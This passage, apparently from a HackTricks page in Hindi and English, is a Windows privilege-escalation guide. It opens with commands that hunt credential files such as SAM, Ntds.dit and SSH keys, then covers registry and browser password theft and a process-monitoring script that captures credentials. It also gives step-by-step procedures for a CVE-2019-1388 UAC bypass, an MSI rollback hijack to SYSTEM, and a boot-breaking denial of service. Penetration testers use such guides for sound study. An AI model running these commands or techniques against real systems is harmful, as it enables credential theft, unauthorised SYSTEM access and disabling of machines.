dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Credentials in the RecycleBin

आपको Bin को भी चेक करना चाहिए ताकि उसमें मौजूद credentials मिल सकें।

कई प्रोग्राम्स द्वारा सेव किए गए **passwords** recover करने के लिए आप उपयोग कर सकते हैं: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### रजिस्ट्री के अंदर

**अन्य संभावित registry keys जिनमें credentials हो सकते हैं**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### ब्राउज़र इतिहास

आपको उन dbs की जाँच करनी चाहिए जहाँ **Chrome or Firefox** के **passwords** स्टोर होते हैं.\
ब्राउज़र के history, bookmarks और favourites भी चेक करें, क्योंकि शायद कुछ **passwords** वहाँ स्टोर हों।

Tools to extract passwords from browsers:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

Component Object Model (COM) एक तकनीक है जो Windows operating system के भीतर निर्मित है और विभिन्न भाषाओं में बने software components के बीच intercommunication की अनुमति देती है। प्रत्येक COM component को एक class ID (CLSID) के माध्यम से पहचान किया जाता है और प्रत्येक component एक या अधिक interfaces के जरिए functionality expose करता है, जिन्हें interface IDs (IIDs) से पहचाना जाता है।

COM classes और interfaces registry में परिभाषित होते हैं, जो क्रमशः **HKEY\CLASSES\ROOT\CLSID** और **HKEY\CLASSES\ROOT\Interface** के अंतर्गत पाए जाते हैं। यह registry **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** के मर्ज होने से बनती है = **HKEY\CLASSES\ROOT.**

Inside the CLSIDs of this registry you can find the child registry **InProcServer32** which contains a **default value** pointing to a **DLL** and a value called **ThreadingModel** that can be **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) or **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

मूल रूप से, अगर आप उन किसी भी DLLs को overwrite कर सकें जो execute होने वाले हैं, तो आप escalate privileges कर सकते हैं अगर वह DLL किसी अलग user द्वारा execute किया जाएगा।

To learn how attackers use COM Hijacking as a persistence mechanism check:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Generic Password search in files and registry**

**फ़ाइल की सामग्री खोजें**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**किसी विशेष फ़ाइलनाम वाली फ़ाइल खोजें**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**key names और passwords के लिए registry खोजें**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### पासवर्ड खोजने वाले टूल

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** plugin। यह plugin हर उस metasploit POST module को स्वचालित रूप से चलाने के लिए बनाया गया है जो victim के भीतर credentials खोजता है।\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) इस पेज में बताए गए उन सभी फ़ाइलों को स्वतः खोजता है जिनमें passwords होते हैं।\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) एक और बेहतरीन टूल है जो सिस्टम से password निकालने के लिए उपयोग होता है।

टूल [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) उन कई टूल्स के **sessions**, **usernames** और **passwords** खोजता है जो यह डेटा clear text में सेव करते हैं (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

कल्पना करें कि **SYSTEM के रूप में चल रहा एक process एक नया process खोलता है** (`OpenProcess()`) जिसमें **full access** हो। वही process **एक और नया process भी बनाता है** (`CreateProcess()`) जो **low privileges वाला होता है लेकिन मुख्य process के सभी open handles को inherit कर लेता है**.\
फिर, अगर आपके पास **low privileged process तक full access** है, तो आप `OpenProcess()` द्वारा बनाए गए privileged process के **open handle** को पकड़कर उसमें **shellcode inject** कर सकते हैं.\
[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)\
[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Shared memory segments, जिन्हें **pipes** कहा जाता है, प्रक्रियाओं के बीच communication और data transfer सक्षम करते हैं।

Windows एक सुविधा देता है जिसे **Named Pipes** कहा जाता है, जो unrelated processes को data share करने की अनुमति देता है, यहाँ तक कि अलग-अलग networks पर भी। यह client/server architecture जैसा होता है, जिसमें भूमिकाएँ **named pipe server** और **named pipe client** के रूप में परिभाषित होती हैं।

जब कोई **client** pipe के माध्यम से data भेजता है, तो जिस **server** ने वह pipe सेटअप किया है उसके पास **SeImpersonate** rights होने पर उस **client** की पहचान को **लेने** की क्षमता होती है। ऐसी किसी **privileged process** की पहचान करना जो उस pipe के माध्यम से communicate करती है और जिसे आप mimic कर सकते हैं, आपको मौका देता है कि आप उस process की identity अपना कर **higher privileges** प्राप्त कर लें जब वह आपके द्वारा बनाए गए pipe पर interact करे। इस तरह के attack को execute करने के निर्देशों के लिए उपयोगी गाइड [**here**](named-pipe-client-impersonation.md) और [**here**](#from-high-integrity-to-system) पर मिलते हैं।

इसके अलावा निम्नलिखित tool आपको **burp जैसे tool के साथ named pipe communication को intercept करने** की अनुमति देता है: [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) और यह tool सभी pipes को list और देख कर privescs खोजने की अनुमति देता है: [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Misc

### File Extensions that could execute stuff in Windows

इस पेज को देखें **[https://filesec.io/](https://filesec.io/)**

### **Monitoring Command Lines for passwords**

जब user के रूप में shell मिल जाता है, तो scheduled tasks या अन्य processes चल रहे हो सकते हैं जो **command line पर credentials पास करते हैं**। नीचे दिया गया script हर दो सेकंड में process की command lines को capture करता है और वर्तमान स्थिति की तुलना पिछली स्थिति से करता है, तथा कोई भी भिन्नताएँ output करता है।
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Stealing passwords from processes

## From Low Priv User to NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

यदि आपके पास ग्राफिकल इंटरफ़ेस (console या RDP के माध्यम से) तक पहुँच है और UAC सक्षम है, तो Microsoft Windows के कुछ संस्करणों में अनप्रिविलेज्ड यूज़र से "NT\AUTHORITY SYSTEM" जैसे terminal या किसी अन्य process को चलाना संभव है।

यह उसी vulnerability के साथ privileges escalate करने और एक ही समय में UAC को bypass करने की अनुमति देता है। इसके अलावा, कुछ भी install करने की आवश्यकता नहीं होती है और प्रक्रिया के दौरान उपयोग किया गया binary Microsoft द्वारा signed और issued है।

Some of the affected systems are the following:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
इस vulnerability को exploit करने के लिए, निम्नलिखित चरणों का पालन करना आवश्यक है:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
You have all the necessary files and information in the following GitHub repository:

https://github.com/jas502n/CVE-2019-1388

## From Administrator Medium to High Integrity Level / UAC Bypass

इसे पढ़ें ताकि आप **Integrity Levels** के बारे में सीख सकें:


{{#ref}}
integrity-levels.md
{{#endref}}

फिर **इसे पढ़ें ताकि आप UAC और UAC bypasses के बारे में जान सकें:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP

यह तकनीक [**in this blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) में वर्णित है और इसका exploit code [**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs) मौजूद है।

यह attack मूलतः Windows Installer के rollback फीचर का दुरुपयोग करके uninstall प्रक्रिया के दौरान वैध फ़ाइलों को malicious फ़ाइलों से बदलने पर आधारित है। इसके लिए attacker को एक **malicious MSI installer** बनाना होगा जो `C:\Config.Msi` फ़ोल्डर को hijack करने के लिए उपयोग किया जाएगा, जिसे बाद में Windows Installer अन्य MSI पैकेजों के अनइंस्टॉल के दौरान rollback फ़ाइलें स्टोर करने के लिए उपयोग करेगा, जहाँ rollback फ़ाइलों को malicious payload रखने के लिए बदला जा सकता है।

संक्षेपित तकनीक निम्नलिखित है:

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
- Create an `.msi` that installs a harmless file (e.g., `dummy.txt`) in a writable folder (`TARGETDIR`).
- Mark the installer as **"UAC Compliant"**, so a **non-admin user** can run it.
- Keep a **handle** open to the file after install.

- Step 2: Begin Uninstall
- Uninstall the same `.msi`.
- The uninstall process starts moving files to `C:\Config.Msi` and renaming them to `.rbf` files (rollback backups).
- **Poll the open file handle** using `GetFinalPathNameByHandle` to detect when the file becomes `C:\Config.Msi\<random>.rbf`.

- Step 3: Custom Syncing
- The `.msi` includes a **custom uninstall action (`SyncOnRbfWritten`)** that:
- Signals when `.rbf` has been written.
- Then **waits** on another event before continuing the uninstall.

- Step 4: Block Deletion of `.rbf`
- When signaled, **open the `.rbf` file** without `FILE_SHARE_DELETE` — this **prevents it from being deleted**.
- Then **signal back** so the uninstall can finish.
- Windows Installer fails to delete the `.rbf`, and because it can’t delete all contents, **`C:\Config.Msi` is not removed**.

- Step 5: Manually Delete `.rbf`
- You (attacker) delete the `.rbf` file manually.
- Now **`C:\Config.Msi` is empty**, ready to be hijacked.

> At this point, **trigger the SYSTEM-level arbitrary folder delete vulnerability** to delete `C:\Config.Msi`.

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- Recreate the `C:\Config.Msi` folder yourself.
- Set **weak DACLs** (e.g., Everyone:F), and **keep a handle open** with `WRITE_DAC`.

- Step 7: Run Another Install
- Install the `.msi` again, with:
- `TARGETDIR`: Writable location.
- `ERROROUT`: A variable that triggers a forced failure.
- This install will be used to trigger **rollback** again, which reads `.rbs` and `.rbf`.

- Step 8: Monitor for `.rbs`
- Use `ReadDirectoryChangesW` to monitor `C:\Config.Msi` until a new `.rbs` appears.
- Capture its filename.

- Step 9: Sync Before Rollback
- The `.msi` contains a **custom install action (`SyncBeforeRollback`)** that:
- Signals an event when the `.rbs` is created.
- Then **waits** before continuing.

- Step 10: Reapply Weak ACL
- After receiving the `.rbs created` event:
- The Windows Installer **reapplies strong ACLs** to `C:\Config.Msi`.
- But since you still have a handle with `WRITE_DAC`, you can **reapply weak ACLs** again.

> ACLs are **only enforced on handle open**, so you can still write to the folder.

- Step 11: Drop Fake `.rbs` and `.rbf`
- Overwrite the `.rbs` file with a **fake rollback script** that tells Windows to:
- Restore your `.rbf` file (malicious DLL) into a **privileged location** (e.g., `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Drop your fake `.rbf` containing a **malicious SYSTEM-level payload DLL**.

- Step 12: Trigger the Rollback
- Signal the sync event so the installer resumes.
- A **type 19 custom action (`ErrorOut`)** is configured to **intentionally fail the install** at a known point.
- This causes **rollback to begin**.

- Step 13: SYSTEM Installs Your DLL
- Windows Installer:
- Reads your malicious `.rbs`.
- Copies your `.rbf` DLL into the target location.
- You now have your **malicious DLL in a SYSTEM-loaded path**.

- Final Step: Execute SYSTEM Code
- Run a trusted **auto-elevated binary** (e.g., `osk.exe`) that loads the DLL you hijacked.
- **Boom**: Your code is executed **as SYSTEM**.


### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

मुख्य MSI rollback तकनीक (पिछली वाली) यह मानती है कि आप एक **entire folder** (उदा., `C:\Config.Msi`) को हटा सकते हैं। लेकिन अगर आपकी vulnerability केवल **arbitrary file deletion** की अनुमति देती है तो क्या होगा?

आप **NTFS internals** का दुरुपयोग कर सकते हैं: हर फ़ोल्डर में एक छिपा हुआ alternate data stream होता है जिसका नाम होता है:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
यह स्ट्रीम फ़ोल्डर का **इंडेक्स मेटाडेटा** संग्रहीत करता है।

इसलिए, अगर आप किसी फ़ोल्डर का **`::$INDEX_ALLOCATION` स्ट्रीम हटा देते हैं**, तो NTFS फ़ाइल सिस्टम से पूरा फ़ोल्डर **हटा देता है**।

आप यह मानक फ़ाइल हटाने वाली APIs का उपयोग करके कर सकते हैं, जैसे:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> भले ही आप *file* delete API को कॉल कर रहे हैं, यह **फोल्डर खुद को डिलीट कर देता है**।

### फ़ोल्डर की सामग्री हटाने से SYSTEM EoP तक
अगर आपका primitive आपको arbitrary files/folders को हटाने की अनुमति नहीं देता, लेकिन यह **attacker-controlled फ़ोल्डर की *contents* को हटाने की अनुमति देता है** तो क्या होगा?

1. Step 1: Setup a bait folder and file
- Create: `C:\temp\folder1`
- Inside it: `C:\temp\folder1\file1.txt`

2. Step 2: `file1.txt` पर एक **oplock** लगाएँ
- जब कोई privileged process `file1.txt` को delete करने की कोशिश करता है तो oplock **execution को रोक देता है**।
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. चरण 3: SYSTEM प्रक्रिया ट्रिगर करें (उदा., `SilentCleanup`)
- यह प्रक्रिया फ़ोल्डरों (उदा., `%TEMP%`) को स्कैन करती है और उनके कंटेंट को हटाने का प्रयास करती है।
- जब यह `file1.txt` पर पहुँचती है, तो **oplock triggers** सक्रिय हो जाता है और यह नियंत्रण आपके कॉलबैक को सौंप देता है।

4. चरण 4: oplock कॉलबैक के अंदर – हटाने को पुनर्निर्देशित करें

- विकल्प A: `file1.txt` को कहीं और स्थानांतरित करें
- यह `folder1` को खाली कर देता है बिना oplock को तोड़े।
- `file1.txt` को सीधे न हटाएँ — इससे oplock समय से पहले रिलीज़ हो जाएगा।

- विकल्प B: `folder1` को एक **junction** में बदलें:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- विकल्प C: `\RPC Control` में एक **symlink** बनाएं:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> यह NTFS internal stream को लक्षित करता है जो फ़ोल्डर मेटाडेटा को स्टोर करता है — इसे डिलीट करने से फ़ोल्डर भी डिलीट हो जाता है।

5. Step 5: Release the oplock
- SYSTEM process जारी रहता है और `file1.txt` को डिलीट करने की कोशिश करता है।
- लेकिन अब, junction + symlink के कारण, यह वास्तव में डिलीट कर रहा है:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Result**: `C:\Config.Msi` को SYSTEM द्वारा हटाया जाता है।

### Arbitrary Folder Create से Permanent DoS तक

एक primitive का दुरुपयोग करें जो आपको **SYSTEM/admin के रूप में arbitrary folder create करने** की अनुमति देता है — भले ही आप **फाइलें लिख न सकें** या **कमज़ोर permissions सेट न कर सकें**।

ऐसा एक **फोल्डर** (फाइल नहीं) बनाएं जिसका नाम किसी **critical Windows driver** के समान हो, उदाहरण के लिए:
```
C:\Windows\System32\cng.sys
```
- यह पथ सामान्यतः `cng.sys` kernel-mode ड्राइवर के अनुरूप होता है।
- यदि आप इसे **फ़ोल्डर के रूप में पहले से बना देते हैं**, तो Windows बूट पर वास्तविक ड्राइवर को लोड करने में विफल रहता है।
- फिर, Windows बूट के दौरान `cng.sys` को लोड करने की कोशिश करता है।
- यह फ़ोल्डर देखता है, **वास्तविक ड्राइवर का पता लगाने में विफल रहता है**, और **क्रैश हो जाता है या बूट रुक जाता है**।
- बाहरी हस्तक्षेप (उदा., boot repair या disk access) के बिना **कोई fallback नहीं है**, और **कोई recovery नहीं है**।

## **High Integrity से System तक**

### **नया service**

यदि आप पहले से ही किसी High Integrity process पर चल रहे हैं, तो **SYSTEM तक का रास्ता** केवल **नया service बनाकर और उसे चलाकर** आसान हो सकता है:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> जब कोई service binary बनाते हैं तो सुनिश्चित करें कि यह एक वैध service हो या बाइनरी आवश्यक क्रियाएँ करे क्योंकि अगर यह वैध service नहीं है तो इसे 20s में kill कर दिया जाएगा।

### AlwaysInstallElevated

High Integrity process से आप **AlwaysInstallElevated registry entries** को enable करने और _**.msi**_ wrapper का उपयोग करके एक reverse shell **install** करने की कोशिश कर सकते हैं।\
[More information about the registry keys involved and how to install a _.msi_ package here.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**आप** [**find the code here**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

यदि आपके पास वे token privileges हैं (संभवतः आप इन्हें पहले से किसी High Integrity process में पाएंगे), तो आप SeDebug privilege के साथ लगभग किसी भी प्रक्रिया (protected processes नहीं) को open कर सकेंगे, उस प्रक्रिया का token copy कर सकेंगे, और उस token के साथ किसी arbitrary process को create कर सकेंगे।\
यह तकनीक आमतौर पर SYSTEM के रूप में चल रही किसी प्रक्रिया का चुनाव करती है जिसमें सभी token privileges मौजूद हों (_हाँ, आप SYSTEM प्रक्रियाएँ बिना सभी token privileges के भी पा सकते हैं_)।\
**आप** [**example of code executing the proposed technique here**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

यह technique meterpreter द्वारा getsystem में escalate करने के लिए उपयोग की जाती है। तकनीक में एक pipe बनाना और फिर उस pipe पर लिखने के लिए किसी service को create/abuse करना शामिल है। फिर, वह **server** जिसने pipe बनाया हो और जिसने **`SeImpersonate`** privilege का उपयोग किया हो, pipe client (service) के token को **impersonate** कर के SYSTEM privileges प्राप्त कर लेगा।\
यदि आप [**learn more about name pipes you should read this**](#named-pipe-client-impersonation) तो और पढ़ें।\
यदि आप [**how to go from high integrity to System using name pipes you should read this**](from-high-integrity-to-system-with-name-pipes.md) का उदाहरण पढ़ना चाहते हैं तो वह भी देखें।

### Dll Hijacking

यदि आप ऐसी dll को **hijack** करने में सफल हो जाते हैं जिसे SYSTEM के रूप में चल रही किसी **process** द्वारा **load** किया जा रहा है तो आप उन permissions के साथ arbitrary code execute कर पाएंगे। इसलिए Dll Hijacking इस तरह की privilege escalation के लिए उपयोगी है, और इसके अलावा इसे high integrity process से हासिल करना कहीं अधिक आसान होता है क्योंकि उस प्रक्रिया के पास dlls load करने वाली folders पर **write permissions** होंगे।\
**आप** [**learn more about Dll hijacking here**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**पढ़ें:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## और मदद

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## उपयोगी टूल

**Windows local privilege escalation vectors देखने के लिए सबसे अच्छा टूल:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- misconfigurations और sensitive files के लिए चेक करें (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- कुछ संभावित misconfigurations की जाँच और जानकारी इकट्ठा करें (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- misconfigurations के लिए चेक करें**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- यह PuTTY, WinSCP, SuperPuTTY, FileZilla, और RDP saved session जानकारी निकालता है। लोकल में -Thorough का उपयोग करें।**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager से credentials निकालता है। Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- इकट्ठा किए गए पासवर्ड्स को domain पर spray करता है**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh एक PowerShell ADIDNS/LLMNR/mDNS/NBNS spoofer और man-in-the-middle टूल है।**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- बेसिक privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- ज्ञात privesc vulnerabilities के लिए खोज (DEPRECATED for Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- लोकल चेक्स **(Admin अधिकारों की ज़रूरत है)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- ज्ञात privesc vulnerabilities के लिए खोज (VisualStudio का उपयोग कर compile करना होगा) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- host को enumerate करके misconfigurations खोजता है (ज्यादा एक gather info टूल है बजाय privesc के) (compile करना होगा) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- कई softwares से credentials निकालता है (github पर precompiled exe मौजूद)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp का C# पोर्ट**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- misconfiguration के लिए चेक (executable github पर precompiled)। सिफारिश नहीं की जाती। यह Win10 पर अच्छा काम नहीं करता।\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- संभावित misconfigurations के लिए चेक (python से exe)। सिफारिश नहीं की जाती। यह Win10 पर अच्छा काम नहीं करता।

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- यह पोस्ट आधारित टूल है (इसे सही तरीके से काम करने के लिए accesschk की आवश्यकता नहीं है पर यह इसका उपयोग कर सकता है)।

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** का आउटपुट पढ़कर काम करने वाले एक्सप्लॉइट्स सुझाव देता है (लोकल python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** का आउटपुट पढ़कर काम करने वाले एक्सप्लॉइट्स सुझाव देता है (लोकल python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

प्रोजेक्ट को सही .NET संस्करण का उपयोग करते हुए compile करना होगा ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). लक्षित होस्ट पर इंस्टॉल .NET संस्करण देखने के लिए आप कर सकते हैं:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## संदर्भ

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)

{{#include ../../banners/hacktricks-training.md}}
